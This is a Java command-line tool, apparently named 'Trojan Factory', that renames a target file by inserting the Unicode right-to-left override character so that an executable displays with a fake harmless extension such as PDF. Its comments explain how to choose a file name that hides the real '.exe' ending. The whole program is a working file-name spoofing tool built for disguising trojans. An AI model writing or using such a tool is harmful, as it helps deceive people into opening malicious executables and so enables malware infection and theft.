import java.io.File;
import java.util.Scanner;
import java.util.Formatter;

public class TrojanFactory {
	public static void main(String[] args) {
		File current_name, new_name;
		Formatter $error_new_exist, $error_current_notFound;
		Scanner scaner = new Scanner(System.in);
		
		boolean rename_operation;
		char rc; // reverse character
		String $black, $red, $green, $yellow, $gray, $bold, $reset,
		fake_extension, real_extension, file_name;
		
		/***** Colors *****/
		$black = "\033[30m";
		$red = "\033[31m";
		$green = "\033[32m";
		$yellow = "\033[33m";
		$gray = "\033[90m";
		$bold = "\033[1m";
		$reset = "\033[0m";
		/****************/
		
		/***** Commands *****/
		
		rc = '\u202e';
		
		Logo();
		
		System.out.print("target file: ");
		current_name = new File(scaner.next());

		System.out.print("file name: ");
		file_name = scaner.next();
		
		System.out.print("real extension: ");
		real_extension = scaner.next();
		
		System.out.print("fake extension: ");
		fake_extension = scaner.next();
		
		if (current_name.exists()) {
			fake_extension = new StringBuilder(fake_extension).reverse().toString(); 
			new_name = new File(file_name + rc + fake_extension + "." + real_extension);
			/*
			 * 1: file_name (Ex: ann) (after the "ann" and "exe" will be added then it will become "annexe")
			 * // to spoof exe file name (see english "https://lotsofwords.com/" words that ends with the wanted extension..
			 * // and remove the last letters that matches the extension to make it as a whole file name "word")
			 * 
			 * 2: rc
			 * 3: fake_extension (Ex: pdf)
			 * 4: real_extension (Ex: exe)
			 * 
			 * 3 > reverse < 4
			 * fake: "exe.pdf"
			 * real "pdf.exe"
			 * 
			 * with ann:
			 * 	annexe.pdf
			 */
			if (!(new_name.exists())) {
				rename_operation = current_name.renameTo(new_name);

				if (rename_operation == true) {
					System.out.print("Changed successfully");
				} else {
					System.out.print("Couldn't change it ):");
				}
			} else {
				$error_new_exist = new Formatter();
				$error_new_exist.format("%s- Error: %s%s at destination path is exist.%s", $red, $gray, new_name, $reset);
				System.out.print($error_new_exist);
			}
		} else {
			$error_current_notFound = new Formatter();
			$error_current_notFound.format("%s- Error: %s%s target file is not exist.%s", $red, $gray, current_name, $reset);
			System.out.print($error_current_notFound);
		}
	}
	
	public static void Logo() {
		Formatter $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11;
		String $red, $green, $reset;
		$red = "\033[31m";
		$green = "\033[32m";
		$reset = "\033[0m";
		$1 = new Formatter();
		$2 = new Formatter();
		$3 = new Formatter();
		$4 = new Formatter();
		$5 = new Formatter();
		$6 = new Formatter();
		$7 = new Formatter();
		$8 = new Formatter();
		$9 = new Formatter();
		$10 = new Formatter();
		$11 = new Formatter();
		
		$1.format("%s88888888888               d8b                   %s8888888888                888%s", $red, $green, $reset);
		$2.format("%s    888                   Y8P                   %s888                       888%s", $red, $green, $reset);
		$3.format("%s    888                                         %s888                       888%s", $red, $green, $reset);
		$4.format("%s    888  888d888 .d88b.  8888  8888b.  88888b.  %s8888888  8888b.   .d8888b 888888 .d88b.  888d888 888  888%s", $red, $green, $reset);
		$5.format("%s    888  888P\"  d88\"\"88b \"888     \"88b 888 \"88b %s888         \"88b d88P\"    888   d88\"\"88b 888P\"   888  888%s", $red, $green, $reset);
		$6.format("%s    888  888    888  888  888 .d888888 888  888 %s888     .d888888 888      888   888  888 888     888  888%s", $red, $green, $reset);
		$7.format("%s    888  888    Y88..88P  888 888  888 888  888 %s888     888  888 Y88b.    Y88b. Y88..88P 888     Y88b 888%s", $red, $green, $reset);
		$8.format("%s    888  888     \"Y88P\"   888 \"Y888888 888  888 %s888     \"Y888888  \"Y8888P  \"Y888 \"Y88P\"  888      \"Y88888%s", $red, $green, $reset);
		$9.format("%s                          888                                                                         %s888%s", $red, $green, $reset);
		$10.format("%s                         d88P                                                                    %sY8b d88P%s", $red, $green, $reset);
		$11.format("%s                       888P\"                                                                      %s\"Y88P\"%s", $red, $green, $reset);
		System.out.println($1);
		System.out.println($2);
		System.out.println($3);
		System.out.println($4);
		System.out.println($5);
		System.out.println($6);
		System.out.println($7);
		System.out.println($8);
		System.out.println($9);
		System.out.println($10);
		System.out.println($11);		
	}

}
